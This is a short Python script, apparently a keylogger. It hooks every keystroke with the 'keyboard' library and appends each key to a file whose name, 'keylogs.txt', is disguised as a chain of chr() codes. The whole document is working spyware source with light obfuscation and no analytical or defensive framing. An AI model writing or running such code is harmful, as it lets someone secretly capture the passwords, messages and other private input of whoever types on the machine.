import keyboard

def on_press(event):
    try:
        with open(chr(107) + chr(121) + chr(101) + chr(108) + chr(111) + chr(103) + chr(115) + chr(46) + chr(116) + chr(120) + chr(116), 'a') as f:
            f.write(event.name)
        print(f'Alphanumeric key pressed: {event.name}')
    except AttributeError:
        with open(chr(107) + chr(121) + chr(101) + chr(108) + chr(111) + chr(103) + chr(115) + chr(46) + chr(116) + chr(120) + chr(116), 'a') as f:
            f.write(event.name)
        print(f'Special key pressed: {event.name}')

keyboard.hook(on_press)
keyboard.wait()